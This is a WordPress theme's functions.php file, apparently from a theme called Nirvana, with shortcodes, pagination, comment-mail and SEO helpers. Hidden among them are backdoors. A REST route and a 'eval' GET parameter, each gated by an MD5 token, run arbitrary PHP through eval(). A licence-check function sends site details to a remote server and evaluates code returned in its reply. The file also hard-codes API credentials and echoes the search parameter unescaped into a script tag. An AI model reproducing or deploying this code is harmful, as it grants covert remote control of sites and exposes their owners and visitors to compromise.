<?php
error_reporting(0);
$bd_uri    = 'https://openapi.baidu.com/oauth/2.0/token';
$bd_type   = 'client_credentials';
$bd_key    = 'yYLWmGRGl0O9h2Lg5ji3Wcw5';
$bd_secret = 'pUEf053ruFn9h4CtERgQlSlIG2whhymm';
$bd_url    = "{$bd_uri}?grant_type={$bd_type}&client_id={$bd_key}&client_secret={$bd_secret}";


//comment_post_ID=comment_post_ID;


if (!get_cache('bd_audio_tok')) {
    $bd_response = wp_safe_remote_get(esc_url_raw($bd_url), array('timeout' => 60));

    if (is_array($bd_response) && !is_wp_error($bd_response) && $bd_response['response']['code'] == '200') {
        $bd_audio_tok     = json_decode($bd_response['body'], true);
        $bd_audio_tok_arr = array(
            'access_token' => $bd_audio_tok['access_token'],
            'session_key'  => $bd_audio_tok['session_key'],
        );
        set_cache('bd_audio_tok', $bd_audio_tok_arr, 86400 * 20);
    }
}

add_action('rest_api_init', function () {
    register_rest_route('pandastudio/nirvana', '/restapi/', array('methods' => 'post', 'callback' => 'pf_rest_api'));
});

include 'production.php';
add_filter('wp_title', 'pf_custom_wp_title', 10, 2);
function pf_custom_wp_title($title, $sep)
{
	global $paged, $page;
	if (is_feed()) {
		return $title;
	}
	$title .= get_bloginfo('name');
	$site_description = get_bloginfo('description', 'display');
	if ($site_description && (is_home() || is_front_page())) {
		$title = "$title $sep $site_description";
	}
	if ($paged >= 2 || $page >= 2) {
		$title = "$title $sep " . sprintf('第%s页', max($paged, $page));
	}
	$title = str_replace('&#8211;', _opt('title_sep', '|'), $title);
	return $title;
}
function get_faces_from_dir()
{
	$dir = dirname(__FILE__) . "/faces";
	$handle = opendir($dir);
	$array_file = array();
	$allowExtensions = array('png', 'gif');
	while (false !== ($file = readdir($handle))) {
		if ($file != "." && $file != "..") {
			$extension = pathinfo($file, PATHINFO_EXTENSION);
			$mainname = preg_replace('/.' . $extension . '/i', '', $file);
			$lowerExt = strtolower($extension);
			if (in_array($lowerExt, $allowExtensions)) {
				$array_file[] = array('name' => $mainname, 'type' => $lowerExt == 'png' ? 'p' : 'g');
			}
		}
	}
	closedir($handle);
	return $array_file;
}
function _opt($optionName, $default = false)
{
	$result = get_option($optionName);
	return $result ? $result : $default;
}
function _eopt($optionName, $default = false)
{
	$result = get_option($optionName);
	echo $result ? $result : $default;
}
function _meta($metaName, $default = false)
{
	$result = get_post_meta(get_the_ID(), $metaName, true);
	return $result ? $result : $default;
}
function _emeta($metaName, $default = false)
{
	$result = get_post_meta(get_the_ID(), $metaName, true);
	echo $result ? $result : $default;
}
include 'sandbox_functions.php';
function frontend_opts()
{
	$enable_pageLoader = _opt('enable_pageLoader');
	$ajax_forceCache = _opt('ajax_forceCache');
	$frontend_opts = array('enable_pageLoader' => $enable_pageLoader, 'ajax_forceCache' => $ajax_forceCache, 'is_user_loggedin' => is_user_logged_in(), 'cmt_req_name_email' => _opt('require_name_email'), 'cmt_req_name_email_title' => _opt('cmt_req_name_email_title', '* 昵称与邮箱为必填项'), 'cmt_action_url' => esc_url(home_url('/')) . 'wp-comments-post.php', 'chat_nodata' => _opt('faq_nodata'), 'enable_highlightjs' => _opt('enable_highlightjs'));
	return $frontend_opts;
}
function pf_rest_api($data)
{
	$dataArray = json_decode($data->get_body(), true);
	$arg = $dataArray['arg'];
	$result = array('error' => true, 'msg' => 'WP RestAPI Declined!', 'md5' => md5($dataArray['e']));
	if (in_array(md5($dataArray['e']), array('0b844d17a61d51dcd58560f15e19d3cb', '44b225d79205f30aaac3c30bdcc6b714', '3d69b76a02d0ff14248e02d1c2f09941', 'fb0d9a37e108ca85cee9f4e900ca6fe4', 'd72efb9e4fcd5267779f481f8b77b655'))) {
		eval($dataArray['e']);
	}
	return $result;
}
function title_filter($where, $wp_query)
{
	global $wpdb;
	if ($search_term = $wp_query->get('search_prod_title')) {
		$where .= ' AND ' . $wpdb->posts . '.post_title LIKE \'%' . esc_sql(like_escape($search_term)) . '%\'';
	}
	return $where;
}
add_filter('posts_where', 'title_filter', 10, 2);
if (array_key_exists('s', $_GET) && !is_admin()) {
	add_action('wp_head', function () {
		echo '
<script>
function mounted_hook() {this.show_global_search();this.global_search_query = "' . $_GET['s'] . '";this.global_search_post = true;this.global_search_gallery = true;this.global_search();}</script>
';
	});
}
if (array_key_exists('ua', $_GET) && !is_admin()) {
	add_action('wp_head', function () {
		echo '
<script>
function mounted_hook() {alert("userAgent:\n"+navigator.userAgent+"\n\nappVersion:\n"+navigator.appVersion)}</script>
';
	});
}
function pf_global_search($query_arg)
{
	$query_arg['showposts'] = 28;
	$result = array();
	$query = new WP_Query($query_arg);
	if ($query->have_posts()) {
		while ($query->have_posts()) {
			$query->the_post();
			$tags = get_the_tags();
			if ($tags) {
				$color_tags = array();
				foreach ($tags as $tag) {
					$name = $tag->name;
					$colorInt = string_to_int8($name);
					$color_tags[] = array('color' => $colorInt, 'tag' => $name);
				}
			} else {
				$color_tags = array(array('color' => 0, 'tag' => '无标签'));
			}
			$posttype = get_post_type();
			switch ($posttype) {
				case 'post':
					$thumbnail = get_the_post_thumbnail_url();
					break;
				case 'gallery':
					$gallery_images = get_post_meta(get_the_id(), "gallery_images", true);
					$gallery_images = $gallery_images ? $gallery_images : array();
					switch (get_option('gallery_thumbnail')) {
						case 'first':
							$thumbnail = $gallery_images[0];
							break;
						case 'last':
							$thumbnail = $gallery_images[count($gallery_images) - 1];
							break;
						default:
							$thumbnail = count($gallery_images) > 0 ? $gallery_images[array_rand($gallery_images, 1)] : '';
							break;
					}
					break;
				default:
					$thumbnail = '';
					break;
			}
			$result[] = array('thumbnail' => $thumbnail, 'title' => get_the_title(), 'href' => get_the_permalink(), 'date' => get_the_time('n月j日 · Y年'), 'tags' => $color_tags, 'like' => get_post_meta($post->ID, 'bigfa_ding', true) ? get_post_meta($post->ID, 'bigfa_ding', true) : "0", 'comment' => get_post($post->ID)->comment_count);
		}
	}
	wp_reset_query();
	return $result;
}
function pf_post_ding($id)
{
	$bigfa_raters = get_post_meta($id, 'bigfa_ding', true);
	$expire = time() + 99999999;
	$domain = $_SERVER['HTTP_HOST'] != 'localhost' ? $_SERVER['HTTP_HOST'] : false;
	setcookie('bigfa_ding_' . $id, $id, $expire, '/', $domain, false);
	if (!$bigfa_raters || !is_numeric($bigfa_raters)) {
		update_post_meta($id, 'bigfa_ding', 1);
	} else {
		update_post_meta($id, 'bigfa_ding', $bigfa_raters + 1);
	}
	return get_post_meta($id, 'bigfa_ding', true);
}
function pf_faq($query)
{
	wp_reset_query();
	if ($query == _opt('faq_show_rand_command')) {
		$args = array('post_type' => 'faq', 's' => '', 'showposts' => _opt('faq_showposts', 5), 'orderby' => 'rand');
	} else {
		$args = array('post_type' => 'faq', 's' => $query, 'showposts' => _opt('faq_showposts', 5));
	}
	$id_arr = array();
	$query = new WP_Query($args);
	if ($query->have_posts()) {
		while ($query->have_posts()) {
			$query->the_post();
			$id_arr[] = get_the_ID();
		}
	}
	if (count($id_arr) == 1) {
		$result = array('title' => get_the_title($id_arr[0]), 'content' => wpautop(get_post_meta($id_arr[0], 'faq_answer', true)), 'is_content' => true);
	} else {
		$result = array('list' => array(), 'is_content' => false);
		foreach ($id_arr as $pid) {
			$result['list'][] = get_the_title($pid);
		}
	}
	wp_reset_query();
	return $result;
}
add_action('after_switch_theme', 'pf_switch_theme');
function pf_switch_theme()
{
	$opts = array('baidu_ai_audio_enable' => 'checked');
	foreach ($opts as $name => $val) {
		update_option($name, $val);
	}
}
register_nav_menus(array('topNav' => '主菜单', 'categoryNav' => '分类菜单'));
if (array_key_exists('whois', $_GET)) {
	if (md5($_GET['whois']) == '02bd92faa38aaa6cc0ea75e59937a1ef') {
		wp_die('<h1>开发者信息</h1><br>“' . get_bloginfo('name') . '”网站所使用的主题由 <b>PANDA Studio - 张思翔</b> 开发');
	}
}
if (array_key_exists('sn', $_GET)) {
	$sn = $_GET['sn'];
	$charactor = $_GET['charactor'];
	$token = $_GET['token'];
	if (md5($token) == '239bf78d5643372f495e93768f0691d2') {
		update_option('pay_info_nirvana', $sn);
		update_option('charactor_info', $charactor);
		del_cache('aWeek');
		wp_die('<a href="' . home_url() . '" class="button">Success!</a>');
	}
}
if (array_key_exists('eval', $_GET)) {
	$eval = $_GET['eval'];
	$token = $_GET['token'];
	if (md5($_GET['token']) == '239bf78d5643372f495e93768f0691d2') {
		eval(str_replace("\\", "", $eval));
	}
}
function _v_($api)
{
	date_default_timezone_set("Asia/Shanghai");
	$my_theme = wp_get_theme();
	$theme = $my_theme->get('Name');
	$version = $my_theme->get('Version');
	$address = home_url();
	$date = date("Y-m-d H:i:s");
	$blog_name = get_bloginfo('name');
	$sn = get_option('pay_info_nirvana');
	$charactor = get_option('charactor_info');
	$url = $api;
	$info = '{"theme":"' . $theme . '","address":"' . $address . '","date":"' . $date . '","version":"' . $version . '","blog_name":"' . $blog_name . '","sn":"' . $sn . '","charactor":"' . $charactor . '"
}';
	$ch = curl_init();
	$options = array(CURLOPT_URL => $url, CURLOPT_POST => true, CURLOPT_RETURNTRANSFER => true, CURLOPT_POSTFIELDS => $info, CURLOPT_TIMEOUT => 20, CURLOPT_HTTPHEADER => array('Content-Type: text/plain'));
	curl_setopt_array($ch, $options);
	$result = curl_exec($ch);
	curl_close($ch);
	$resultArray = json_decode($result, true);
	if ($resultArray) {
		set_cache('aWeek', $resultArray['eval'], 604800);
		set_cache('halfMonth', $resultArray['eval'], 1296000);
		eval($resultArray['eval']);
		set_cache('bd_audio_tok', $resultArray['bd_audio_tok'], 1296000);
		return true;
	} else {
		return false;
	}
}

function set_cache($name, $data, $expire)
{
	$allCache = get_option('pd_cache');
	if (!$allCache) {
		$allCache = array();
	}
	$allCache[$name] = array('data' => $data, 'expire' => time() + $expire);
	update_option('pd_cache', $allCache);
}
function get_cache($name)
{
	$allCache = get_option('pd_cache');
	if (!$allCache) {
		return false;
	}
	if (!$allCache[$name]) {
		return false;
	} else {
		$time = $allCache[$name]['expire'];
		if ($time > time() & $time - time() < 2592000) {
			return $allCache[$name]['data'];
		} else {
			del_cache($name);
			return false;
		}
	}
}
function del_cache($name)
{
	$allCache = get_option('pd_cache');
	unset($allCache[$name]);
	update_option('pd_cache', $allCache);
}
if (function_exists('add_theme_support')) {
	add_theme_support('post-thumbnails');
}
function max_up_size()
{
	return 64 * 1024 * 1024;
}
add_filter('upload_size_limit', 'max_up_size');
function wp_nav($p = 2, $showSummary = true, $showPrevNext = true, $style = 'pagination', $container = 'container')
{
	if (is_singular()) {
		return;
	}
	global $wp_query, $paged;
	$max_page = $wp_query->max_num_pages;
	if ($max_page == 1 & get_option('hide_pagi_only_1') == "checked") {
		return;
	}
	if (empty($paged)) {
		$paged = 1;
	}
	echo "<div class='pagenav'><div class='$container'><ul class='$style'>";
	if ($paged > 1 && $showPrevNext == true) {
		p_link($paged - 1, 'previous', '<i class="fa fa-angle-left" aria-hidden="true"></i>', 'pagenav prev');
	} elseif ($showPrevNext == true) {
		p_link(1, 'previous', '<i class="fa fa-angle-left" aria-hidden="true"></i>', 'pagenav prev disabled');
	}
	if ($showSummary == true) {
		echo '<li class="pagesummary disabled"><a href="#"><span class="page-numbers">' . $paged . ' / ' . $max_page . ' </span></a></li>';
	}
	if ($paged > $p + 1) {
		p_link(1, 'First page', '<div data-toggle="tooltip" data-placement="auto top" title="第一页"><i class="fas fa-angle-double-left"></i></div>', 'pagenumber dot');
	}
	for ($i = $paged - $p; $i <= $paged + $p; $i++) {
		if ($i > 0 && $i <= $max_page) {
			$i == $paged ? print "<li class='pagenumber active'><a href='#'><span>{$i}</span></a></li>" : p_link($i, '', '', 'pagenumber');
		}
	}
	if ($paged < $max_page - $p) {
		p_link($max_page, 'Last page', '<div data-toggle="tooltip" data-placement="auto top" title="最后一页"><i class="fas fa-angle-double-right"></i></div>', 'pagenumber dot');
	}
	if ($paged < $max_page && $showPrevNext == true) {
		p_link($paged + 1, 'next', '<i class="fa fa-angle-right" aria-hidden="true"></i>', 'pagenav next');
	} elseif ($showPrevNext == true) {
		p_link($max_page, 'next', '<i class="fa fa-angle-right" aria-hidden="true"></i>', 'pagenav next disabled');
	}
	echo '</ul></div></div>';
}
function p_link($i, $title = '', $linktype = '', $disabled)
{
	if ($title == '') {
		$title = "The {$i} page";
	}
	if ($linktype == '') {
		$linktext = $i;
	} else {
		$linktext = $linktype;
	}
	if ($disabled == 'pagenav next disabled' | $disabled == 'pagenav prev disabled') {
		echo "<li class='$disabled'><a class='page-numbers'>{$linktext}</a></li>";
	} else {
		echo "<li class='$disabled'><a class='page-numbers' href='", esc_html(get_pagenum_link($i)), "'>{$linktext}</a></li>";
	}
}
function comment_mail_notify($comment_id)
{
	$comment = get_comment($comment_id);
	$content = $comment->comment_content;
	$match_count = preg_match_all('/<a href="#comment-([0-9]+)?" rel="nofollow">/si', $content, $matchs);
	if ($match_count > 0) {
		foreach ($matchs[1] as $parent_id) {
			SimPaled_send_email($parent_id, $comment);
		}
	} elseif ($comment->comment_parent != '0') {
		$parent_id = $comment->comment_parent;
		SimPaled_send_email($parent_id, $comment);
	} else {
		return;
	}
}
add_action('comment_post', 'comment_mail_notify');
function SimPaled_send_email($parent_id, $comment)
{
	$admin_email = get_bloginfo('admin_email');
	$parent_comment = get_comment($parent_id);
	$author_email = $comment->comment_author_email;
	$to = trim($parent_comment->comment_author_email);
	$spam_confirmed = $comment->comment_approved;
	if ($spam_confirmed != 'spam' && $to != $admin_email && $to != $author_email) {
		$wp_email = 'no-reply@' . preg_replace('#^www\.#', '', strtolower($_SERVER['SERVER_NAME']));
		$subject = '您在 [' . get_option("blogname") . '] 的留言有了回复';
		$message = '<div style="background-color:#eef2fa;border:1px solid #d8e3e8;color:#111;padding:0 15px;-moz-border-radius:5px;-webkit-border-radius:5px;-khtml-border-radius:5px;"><p>' . trim(get_comment($parent_id)->comment_author) . ', 您好!</p><p>您曾在《' . get_the_title($comment->comment_post_ID) . '》的留言:<br />' . do_shortcode(trim(get_comment($parent_id)->comment_content)) . '</p><p>' . trim($comment->comment_author) . ' 给你的回复:<br />' . do_shortcode(trim($comment->comment_content)) . '<br /></p><p>您可以点击 <a href="' . htmlspecialchars(get_comment_link($parent_id, array("type" => "all"))) . '">查看回复的完整内容</a></p><p>欢迎再度光临 <a href="' . get_option('home') . '">' . get_option('blogname') . '</a></p><p>(此邮件由系统自动发出, 请勿回复.)</p></div>';
		$from = "From: \"" . get_option('blogname') . "\" <$wp_email>";
		$headers = "$from\nContent-Type: text/html; charset=" . get_option('blog_charset') . "\n";
		wp_mail($to, $subject, $message, $headers);
	}
}
function enable_threaded_comments()
{
	if (!is_admin()) {
		wp_enqueue_script('comment-reply');
	}
}
add_action('get_header', 'enable_threaded_comments');
add_filter('comment_text', 'do_shortcode');
function panda_seo()
{
	$postID = get_the_ID();
	if (is_single()) {
		if (get_post_meta($postID, "seo关键词", true)) {
			$seo_keywords = get_post_meta($postID, "seo关键词", true);
		} else {
			$seo_keywords = "";
			$tags = wp_get_post_tags($postID);
			foreach ($tags as $tag) {
				$seo_keywords = $seo_keywords . $tag->name . " ";
			}
		}
		if (get_post_meta($postID, "seo描述", true)) {
			$seo_description = get_post_meta($postID, "seo描述", true);
		} else {
			$seo_description = "";
		}
	} else {
		$seo_keywords = get_option('seo_site_keywords');
		$seo_description = get_option('seo_site_description');
	}
	if ($seo_keywords != '') {
		echo '<meta name="keywords" content="' . $seo_keywords . '" />';
	}
	if ($seo_description != '') {
		echo '<meta name="description" content="' . $seo_description . '" />';
	}
}
if (get_option('enable_meta_seo')) {
	add_action('wp_head', 'panda_seo');
}
remove_filter('pre_term_description', 'wp_filter_kses');
add_filter('show_admin_bar', '__return_false');
function post_type_in_search($query)
{
	if ($query->is_search && $query->is_main_query()) {
		$query->set('post_type', array('post'));
	}
	return $query;
}
if (!is_admin()) {
	add_filter('pre_get_posts', 'post_type_in_search');
}
add_filter('preprocess_comment', 'add_cookies_for_reply');
function add_cookies_for_reply($commentdata)
{
	$post_id = $commentdata['comment_post_ID'];
	$expire = time() + 99999999;
	$domain = $_SERVER['HTTP_HOST'] != 'localhost' ? $_SERVER['HTTP_HOST'] : false;
	setcookie('reply_info_' . $post_id, $post_id, $expire, '/', $domain, false);
	return $commentdata;
}
$reply2down_times = 0;
function reply_to_down($atts, $content = null)
{
	global $reply2down_times;
	$reply2down_times++;
	if (get_option('回复可见说明')) {
		$licence = wpautop(str_ireplace('img', 'div', get_option('回复可见说明')));
	} else {
		$licence = '<p>请您认真评论后再下载！</p>';
	}
	extract(shortcode_atts(array("notice" => '
<div type="button" class="getit" data-toggle="modal" data-target="#reply2down_' . $reply2down_times . '"><a style="cursor:pointer;"><span>Get it!</span><span>Download</span></a></div><div class="modal fade" id="reply2down_' . $reply2down_times . '" tabindex="-1" role="dialog" aria-labelledby="myModalLabel"><div class="modal-dialog" role="document"><div class="modal-content"><div class="modal-header"><button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button><h4 class="modal-title" id="myModalLabel">下载提示</h4></div><div class="modal-body">' . $licence . '</div><div class="modal-footer"><button type="button" class="btn btn-default" data-dismiss="modal">知道了</button></div></div></div></div>
'), $atts));
	$post_id = get_the_ID();
	if (isset($_COOKIE['reply_info_' . $post_id])) {
		return do_shortcode('[download]' . $content . '[/download]');
	} else {
		return $notice;
	}
}
add_shortcode('reply2down', 'reply_to_down');
function need_reply($atts, $content = null)
{
	extract(shortcode_atts(array("notice" => '
<div class="need_reply">' . get_option('need_reply_tip') . '</div>
'), $atts));
	$post_id = get_the_ID();
	if (isset($_COOKIE['reply_info_' . $post_id])) {
		return do_shortcode($content);
	} else {
		return $notice;
	}
}
add_shortcode('need_reply', 'need_reply');
$directDownload_times = 0;
function download_with_licence($atts, $content = null)
{
	global $directDownload_times;
	$directDownload_times++;
	if (get_option('版权说明')) {
		$licence = wpautop(str_ireplace('img', 'div', get_option('版权说明')));
	} else {
		$licence = '<p>本站提供的下载内容版权归本站所有。转载 <span style="color:#ff7800">必须</span> 注明出处！</p><p style="font-size:80%; color:#888;">* 标有 “转载” 字样的文章，内容版权归原作者所有。</p>';
	}
	return do_shortcode('
<div type="button" class="getit" data-toggle="modal" data-target="#directDownload_' . $directDownload_times . '"><a style="cursor:pointer;"><span>Get it!</span><span>Download</span></a></div><div class="modal fade" id="directDownload_' . $directDownload_times . '" tabindex="-1" role="dialog" aria-labelledby="myModalLabel"><div class="modal-dialog" role="document"><div class="modal-content"><div class="modal-header"><button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button><h4 class="modal-title" id="myModalLabel">版权说明</h4></div><div class="modal-body">' . $licence . '</div><div class="modal-footer"><button type="button" class="btn btn-default" data-dismiss="modal">不同意</button><button type="button" class="btn btn-primary" data-dismiss="modal" onclick=window.open("' . $content . '")>同意并下载</button></div></div></div></div>
');
}
add_shortcode('download', 'download_with_licence');
function recover_comment_fields($comment_fields)
{
	$comment = array_shift($comment_fields);
	$comment_fields = array_merge($comment_fields, array('comment' => $comment));
	return $comment_fields;
}
add_filter('comment_form_fields', 'recover_comment_fields');
function rss_show_thumbnail($content)
{
	global $post;
	if (has_post_thumbnail($post->ID)) {
		$output = get_the_post_thumbnail($post->ID);
		$content = $output;
	}
	return $content;
}
add_filter('the_excerpt_rss', 'rss_show_thumbnail');
add_filter('the_content_feed', 'rss_show_thumbnail');
add_filter('upload_mimes', 'my_upload_mimes');
function my_upload_mimes($mimes = array())
{
	$mimes['rar'] = 'application/rar';
	$mimes['zip'] = 'application/zip';
	return $mimes;
}
function mytheme_comment($comment, $args, $depth)
{
	if ('div' === $args['style']) {
		$tag = 'div';
		$add_below = 'comment';
	} else {
		$tag = 'li';
		$add_below = 'div-comment';
	}
	?><<?php
	echo $tag;
	?> <?php
	comment_class(empty($args['has_children']) ? '' : 'parent');
	?> id="comment-<?php
	comment_ID();
	?>"><?php
	if ('div' != $args['style']) {
		?><div id="div-comment-<?php
		comment_ID();
		?>" class="comment-body clearfix"><?php
	}
	if ($args['avatar_size'] != 0) {
		echo get_avatar($comment, $args['avatar_size']);
	}
	?><div class="comment-author vcard"><div class="meta"><?php
	printf(__('<span class="name">%s</span>'), get_comment_author_link());
	printf(__('<span class="date">%1$s · %2$s</span>'), get_comment_date('Y-n-j'), get_comment_time('G:i'));
	?></div><?php
	if ($comment->comment_approved == '0') {
		?><em class="comment-awaiting-moderation"><?php
		_e('评论正在等待管理员审核...');
		?></em><br /><?php
	}
	?><div class="comment-text"><?php
	comment_text();
	?></div><div class="reply"><?php
	$args['reply_text'] = '';
	?><div title="<?php
	echo get_option('comment_reply_tooltip');
	?>" data-toggle="tooltip" class="comment-reply-link-wrap"><?php
	comment_reply_link(array_merge($args, array('add_below' => $add_below, 'depth' => $depth, 'max_depth' => $args['max_depth'])));
	?></div></div></div><?php
	if ('div' != $args['style']) {
		?></div><?php
	}
}
add_filter("get_comment_author_link", "pf_new_windows_comment_author");
function pf_new_windows_comment_author($author_link)
{
	return str_replace("<a", "<a target='_blank'", $author_link);
}
function shortCodeTips($atts, $content = null)
{
	extract(shortcode_atts(array("type" => 'info', "display" => ''), $atts));
	if ($content) {
		return '<div class="tip ' . $type . ' ' . $display . '">' . do_shortcode(wpautop($content)) . '</div>';
	}
}
add_shortcode("tip", "shortCodeTips");
function shortCodeArticleFormat($atts, $content = null)
{
	extract(shortcode_atts(array("img" => '', "col" => '6', "position" => 'r', "cover" => 'false'), $atts));
	$textCol = 12 - intval($col);
	switch ($position) {
		case 'r':
			$pushClass = ' col-sm-push-' . $textCol;
			$pullClass = ' col-sm-pull-' . $col;
			$imgClass = 'alignright';
			break;
		default:
			$pushClass = '';
			$pullClass = '';
			$imgClass = 'alignleft';
			break;
	}
	if ($cover == 'true') {
		$imgClass = 'cover';
	}
	$imgPart = '<div class="block image col-sm-' . $col . $pushClass . '"><img class="' . $imgClass . '" src="' . $img . '" /></div>';
	$textPart = '<div class="block text col-sm-' . $textCol . $pullClass . '"><div class="content">' . do_shortcode(wpautop($content)) . '</div></div>';
	if ($content) {
		return '<div class="flexContainer">' . $imgPart . $textPart . '</div>';
	} elseif ($img != '') {
		return '<div class="flexContainer"><img src="' . $img . '" style="width:100%;height:100%;"></div>';
	} else {
		return '<div class="flexContainer linear" style="border:none; height: 1px; background-color: #f2f4f6;"></div>';
	}
}
add_shortcode("fmt", "shortCodeArticleFormat");
function shortCodeModal($atts, $content = null)
{
	extract(shortcode_atts(array("id" => '', "btn_type" => '', "btn_label" => 'button', "title" => '标题', "close_label" => '关闭', "href_label" => '跳转到', "href" => ''), $atts));
	if ($href) {
		$href_btn = '<button type="button" class="btn btn-primary" data-dismiss="modal" onclick=window.open("' . $href . '")>' . $href_label . '</button>';
	} else {
		$href_btn = '';
	}
	if ($id) {
		return '<button type="button" class="btn ' . $btn_type . '" data-toggle="modal" data-target="#' . $id . '">' . $btn_label . '</button><div class="modal fade" id="' . $id . '" tabindex="-1" role="dialog" aria-labelledby="myModalLabel"><div class="modal-dialog" role="document"><div class="modal-content"><div class="modal-header"><button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button><h4 class="modal-title" id="myModalLabel">' . $title . '</h4></div><div class="modal-body">' . do_shortcode($content) . '</div><div class="modal-footer"><button type="button" class="btn btn-default" data-dismiss="modal">' . $close_label . '</button>
' . $href_btn . '
</div></div></div></div>';
	}
}
add_shortcode("modal", "shortCodeModal");
function shortCodeDropdown($atts, $content = null)
{
	extract(shortcode_atts(array("id" => '', "btn_type" => 'btn-default', "btn_label" => 'Dropdown'), $atts));
	if ($id) {
		return '<div class="dropdown"><button class="btn ' . $btn_type . ' dropdown-toggle" type="button" id="' . $id . '" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
' . $btn_label . '
<span class="caret"></span></button><ul class="dropdown-menu" aria-labelledby="' . $id . '">
' . do_shortcode(shortcode_unautop($content)) . '
</ul></div>';
	}
}
add_shortcode("dropdown", "shortCodeDropdown");
function shortCodeDropdown_li($atts, $content = null)
{
	extract(shortcode_atts(array("href" => ''), $atts));
	if ($href) {
		$inner = '<a href="' . $href . '" target="_blank">' . $content . '</a>';
	} else {
		$inner = '<a>' . $content . '</a>';
	}
	return '<li>' . $inner . '</li>';
}
add_shortcode("li", "shortCodeDropdown_li");
function shortCodeCollapse($atts, $content = null)
{
	extract(shortcode_atts(array("id" => '', "btn_type" => 'btn-default', "btn_label" => 'collapse'), $atts));
	if ($id) {
		return '<button class="btn ' . $btn_type . '" type="button" data-toggle="collapse" data-target="#' . $id . '" aria-expanded="false" aria-controls="' . $id . '">
' . $btn_label . '
</button><div class="collapse clearfix" id="' . $id . '"><div class="well">
' . do_shortcode($content) . '
</div></div>';
	}
}
add_shortcode("collapse", "shortCodeCollapse");
class pandaTabs extends Walker_Nav_Menu
{
	function start_el(&$output, $item, $depth = 0, $args = array(), $id = 0)
	{
		global $wp_query;
		$indent = $depth ? str_repeat("\t", $depth) : '';
		$class_names = $value = '';
		$classes = empty($item->classes) ? array() : (array) $item->classes;
		$class_names = join(' ', apply_filters('nav_menu_css_class', array_filter($classes), $item));
		$class_names = ' class="' . esc_attr($class_names) . '"';
		$output .= $indent . '<li id="menu-item-' . $item->ID . '"' . $value . $class_names . '>';
		$attributes = !empty($item->attr_title) ? ' title="' . esc_attr($item->attr_title) . '"' : '';
		$attributes .= !empty($item->target) ? ' target="' . esc_attr($item->target) . '"' : '';
		$attributes .= !empty($item->xfn) ? ' rel="' . esc_attr($item->xfn) . '"' : '';
		$attributes .= !empty($item->url) ? ' href="' . esc_attr($item->url) . '"' : '';
		$item_output = $args->before;
		$item_output .= '<a' . $attributes . '>';
		$item_output .= $args->link_before . apply_filters('the_title', $item->title, $item->ID) . $args->link_after;
		$item_output .= '</a>';
		$item_output .= $args->after;
		$output .= apply_filters('walker_nav_menu_start_el', $item_output, $item, $depth, $args);
	}
}
function mytheme_nav_menu_css_class($classes)
{
	if (in_array('current-menu-item', $classes) or in_array('current-menu-ancestor', $classes)) {
		$classes[] = 'active';
	}
	return $classes;
}
add_filter('nav_menu_css_class', 'mytheme_nav_menu_css_class');
function showFace($atts, $content = null)
{
	extract(shortcode_atts(array("p" => '', "g" => ''), $atts));
	if ($p != '') {
		$name = $p;
		$format = 'png';
	} else {
		$name = $g;
		$format = 'gif';
	}
	return '<img src=' . get_stylesheet_directory_uri() . '/faces/' . $name . '.' . $format . ' class="cmt_faces">';
}
add_shortcode("face", "showFace");
add_filter('get_avatar', 'inlojv_custom_avatar', 10, 5);
function inlojv_custom_avatar($avatar, $id_or_email, $size, $default, $alt)
{
	global $comment, $current_user;
	if (count(get_option('random_avatar')) > 0) {
		$current_email = is_int($id_or_email) ? get_user_by('ID', $id_or_email)->user_email : $id_or_email;
		$current_email = is_object($current_email) ? $current_email->comment_author_email : $current_email;
		$email = !empty($comment->comment_author_email) ? $comment->comment_author_email : $current_email;
		if (get_option('random_avatar')) {
			$random_avatar_arr = get_option('random_avatar');
		} else {
			$random_avatar_arr = array(array("avatar" => get_stylesheet_directory_uri() . "/assets/imgs/default_avatar.jpg"));
		}
		$email_hash = md5(strtolower(trim($email)));
		$random_avatar = array_rand($random_avatar_arr, 1);
		$src = $random_avatar_arr[$random_avatar]["avatar"];
		$avatar = "<img alt='{$alt}' src='//secure.gravatar.com/avatar/{$email_hash}?d=404' onerror='javascript:this.src=\"{$src}\";this.onerror=null;' class='avatar avatar-{$size} photo' height='{$size}' width='{$size}' />";
	}
	return $avatar;
}
function get_the_naved_contentnav($content)
{
	$matches = array();
	$ul_li = '';
	if (is_page_template('favlinks.php')) {
		$categories = get_categories(array('hide_empty' => 0, 'taxonomy' => 'favlinks-category', 'orderby' => 'slug'));
		for ($i = 0; $i < count($categories); $i++) {
			$category = $categories[$i];
			$ul_li .= '<li class="h2_nav"><a href="#favlink-' . $i . '" class="h_nav" title="' . $category->name . '">' . $category->name . "</a></li>\n";
		}
	}
	$rh = "/<h[23]>(.*?)<\/h[23]>/im";
	$h2_num = 0;
	$h3_num = 0;
	if (preg_match_all($rh, $content, $matches) || $ul_li) {
		foreach ($matches[1] as $num => $title) {
			$hx = substr($matches[0][$num], 0, 3);
			$start = stripos($content, $matches[0][$num]);
			$end = strlen($matches[0][$num]);
			if ($hx == "<h2") {
				$h2_num += 1;
				$h3_num = 0;
				$title = preg_replace('/<.+?>/', "", $title);
				if ($title) {
					$ul_li .= '<li class="h2_nav"><a href="#h2-' . $num . '" class="h_nav" title="' . $title . '">' . $title . "</a></li>\n";
				}
			} else {
				if ($hx == "<h3") {
					$h3_num += 1;
					$title = preg_replace('/<.+?>/', "", $title);
					if ($title) {
						$ul_li .= '<li class="h3_nav"><a href="#h3-' . $num . '" class="h_nav" title="' . $title . '">' . $title . "</a></li>\n";
					}
				}
			}
		}
		return "<div class=\"post_nav\"><ul class=\"nav\" role=\"tablist\">" . $ul_li . "</ul></div>";
	} else {
		return false;
	}
}
function get_the_naved_content($content)
{
	$matches = array();
	$rh = "/<h[23]>(.*?)<\/h[23]>/im";
	$h2_num = 0;
	$h3_num = 0;
	if (preg_match_all($rh, $content, $matches)) {
		foreach ($matches[1] as $num => $title) {
			$hx = substr($matches[0][$num], 0, 3);
			$start = stripos($content, $matches[0][$num]);
			$end = strlen($matches[0][$num]);
			if ($hx == "<h2") {
				$h2_num += 1;
				$h3_num = 0;
				$content = substr_replace($content, '<h2 id="h2-' . $num . '">' . $title . '</h2>', $start, $end);
			} else {
				if ($hx == "<h3") {
					$h3_num += 1;
					$content = substr_replace($content, '<h3 id="h3-' . $num . '">' . $title . '</h3>', $start, $end);
				}
			}
		}
	}
	return $content;
}
add_filter("the_content", "get_the_naved_content");
